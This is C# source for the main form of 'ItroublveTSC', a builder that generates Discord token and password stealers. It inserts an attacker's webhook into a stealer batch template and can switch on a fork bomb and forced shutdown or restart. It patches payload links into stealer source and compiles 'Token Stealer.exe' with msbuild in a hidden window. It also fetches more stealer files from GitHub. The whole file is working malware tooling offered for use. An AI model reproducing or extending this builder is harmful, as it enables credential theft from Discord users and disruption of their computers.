using DiscordFlooder.Class.Design.Rainbow;
using RaidAPI.StealToken;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Threading;
using System.Windows.Forms;


namespace ItroublveTSC
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            this.InitializeComponent();
            this.RainbowTimer.Start();
        }
        private void RainbowTimer_Tick(object sender, EventArgs e)
        {
            Rainbow.RainbowEffect();
            this.pnlRainbowTop.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
            this.PnlRainbowDown.BackColor = Color.FromArgb(Rainbow.A, Rainbow.R, Rainbow.G);
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
        }
        private void CreateBtn_Click(object sender, EventArgs e)
        {
            bool flag = this.WebHookTxt.Text == "" || this.WebHookTxt.Text == "WebHook Here";
            if (flag)
            {
                MessageBox.Show("You need to paste a Webhook first!", "ItroublveTSC");
            }
            else
            {
                string _TokenStealer = "TokenStealer.bin";
                string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/output";
                string _CopyTokenStealer = "TokenStealerCOPY.bin";
                if (File.Exists(_CopyTokenStealer))
                {
                    File.Delete(_CopyTokenStealer);
                }
                if (Directory.Exists(_cdDir))
                {
                    Directory.Delete(_cdDir, true);
                }
                try
                {
                    File.Copy(_TokenStealer, _CopyTokenStealer);
                    string text = File.ReadAllText("TokenStealerCOPY.bin");
                    if (CrashPCchkbox.Checked)
                    {
                        text = text.Replace("rem %0|%0", "%0|%0");
                    }
                    if (RestartPCchkbox.Checked)
                    {
                        text = text.Replace("rem SHUTDOWN -r -t 30", "SHUTDOWN -r -t 30");
                    }
                    if (ShutdownPCchkbox.Checked)
                    {
                        text = text.Replace("rem SHUTDOWN /s /t 30 /c", "SHUTDOWN /s /t 30 /c");
                    }
                    text = text.Replace("Webhook", WebHookTxt.Text);
                    File.WriteAllText("TokenStealerCopy.bin", text);
                    DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                    File.Move(_CopyTokenStealer, "output/Token Stealer.bat");
                    File.Delete(_CopyTokenStealer);
                    Stealer.Dialog(this.WebHookTxt.Text);
                    MessageBox.Show("Stealer files successfully created!", "ItroublveTSC");
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to create stealer files!\r\n" + (ex.Message),"ItroublveTSC");
                }

            }
        }
        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }
        private void HeadServerLbl_MouseDown(object sender, MouseEventArgs e)
        {
            Mouse.x = Control.MousePosition.X - base.Location.X;
            Mouse.y = Control.MousePosition.Y - base.Location.Y;
        }
        private void HeadServerLbl_MouseMove(object sender, MouseEventArgs e)
        {
            bool flag = e.Button == MouseButtons.Left;
            if (flag)
            {
                Mouse.newpoint = Control.MousePosition;
                Mouse.newpoint.X = Mouse.newpoint.X - Mouse.x;
                Mouse.newpoint.Y = Mouse.newpoint.Y - Mouse.y;
                base.Location = Mouse.newpoint;
            }
        }

        private void roundBtn1_Click(object sender, EventArgs e)
        {
            bool flag = this.FinalresbatTxt.Text == "" || this.FinalresbatTxt.Text == "Token Stealer.bat Link Here";
            bool flag4 = this.SendhookfileTxt.Text == "" || this.SendhookfileTxt.Text == "Sendhookfile.exe Link Here";
            if (flag)
            {
                MessageBox.Show("You need to paste a link to Token stealer.bat!", "ItroublveTSC");
            }
            if (flag4)
            {
                MessageBox.Show("You need to paste a link to Sendhookfile.exe!", "ItroublveTSC");
            }
            else
            {
                try
                {
                    Process copydir = new Process();
                    ProcessStartInfo startCopydir = new ProcessStartInfo();
                    startCopydir.WindowStyle = ProcessWindowStyle.Hidden;
                    startCopydir.FileName = Path.Combine(Environment.SystemDirectory, "xcopy.exe");
                    startCopydir.Arguments = @"bin bin_copy /Y /E /I";
                    copydir.StartInfo = startCopydir;
                    copydir.Start();
                    Thread.Sleep(2000);
                    string text = File.ReadAllText(@"bin_copy/Program.cs");
                    text = text.Replace("finalresbatch", FinalresbatTxt.Text);
                    text = text.Replace("sendhookfile", SendhookfileTxt.Text);
                    if (AutoRmvExe.Checked)
                    {
                        text = text.Replace("//RemoveEXE", "RemoveEXE");
                    }
                    if (CustomEXEchkbox.Checked)
                    {
                        text = text.Replace("customexelink", CustomExeTxt.Text);
                        text = text.Replace("/*", "");
                        text = text.Replace("*/", "");
                    }
                    File.WriteAllText(@"bin_copy/Program.cs", text);

                    Process.Start(new ProcessStartInfo()
                    {
                        Arguments = "/C C:/Windows/Microsoft.NET/Framework/v4.0.30319/msbuild.exe bin_copy/TSC.sln",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                        FileName = "cmd.exe"
                    });
                    Thread.Sleep(7000);
                }
                catch
                {
                    DialogResult dialogResult = MessageBox.Show("bin folder or files inside missing or modified!\r\n" + "Want to download bin files from Github?", "ItroublveTSC", MessageBoxButtons.YesNo);
                    if (dialogResult == DialogResult.Yes)
                    {
                        string _cdDir = Path.GetDirectoryName(Application.ExecutablePath) + "/bin";
                        DirectoryInfo di = Directory.CreateDirectory(_cdDir);
                        using (WebClient webClient = new WebClient())
                            webClient.DownloadFile("https://github.com/Itroublve/Token-Browser-Password-Stealer-Creator/blob/master/AVOID%20ME/bin.zip?raw=true", "bin/Token Stealer Creator.zip");
                        ZipFile.ExtractToDirectory(_cdDir + "/Token Stealer Creator.zip", _cdDir);
                        File.Delete(_cdDir + "/Token Stealer Creator.zip");
                        MessageBox.Show("bin files has been downloaded successfully.\r\nItroublveTSC will now close, please relauch to create stealer!", "ItroublveTSC");
                        Environment.Exit(0);
                    }
                    else if (dialogResult == DialogResult.No)
                    {
                        MessageBox.Show("OK. FINE THEN. I WILL CLOSE MYSELF!", "ItroublveTSC");
                        Environment.Exit(0);
                    }
                }
                try
                {
                    string path = @"bin_copy\bin\debug\TOKEN STEALER CREATOR.exe";
                    string path2 = "Token Stealer.exe";
                    string folderPath = "bin_copy";
                    if (File.Exists(folderPath))
                    {
                        File.Delete(folderPath);
                    }
                    if (!File.Exists(path))
                    {
                        using (FileStream fs = File.Create(path)) { }
                    }
                    if (File.Exists(path2))
                        File.Delete(path2);
                    File.Move(path, path2);
                    Directory.Delete(folderPath, true);
                    MessageBox.Show("Token Stealer.exe successfully compiled!", "ItroublveTSC");
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Failed to create token stealer.\r\n.NET Framework might be missing, take a look below to know reason!\r\n" + (ex.Message), "ItroublveTSC");
                }
            }
        }

        private void roundBtn1_Click_1(object sender, EventArgs e)
        {
            try
            {
                Process.Start("https://youtu.be/H05oG6aQnto");
            }
            catch(Exception ex)
            {
                MessageBox.Show("Failed to open" + "How To Use\r\n" + (ex.Message), "ItroublveTSC");
            }
        }

        private void CustomEXEchkbox_CheckedChanged(object sender, EventArgs e)
        {
            if (CustomEXEchkbox.Checked)
            {
                CustomExeTxt.Enabled = true;
            }
            else
            {
                CustomExeTxt.Enabled = false;
            }
        }

        private void BootloopPCchckbox_CheckedChanged(object sender, EventArgs e)
        {
            if (BootloopPCchckbox.Checked)
            {
                MessageBox.Show("I'm still working on this feature - Bootloop PC", "ItroublveTSC");
                BootloopPCchckbox.Checked = false;
            }
        }
    }
}
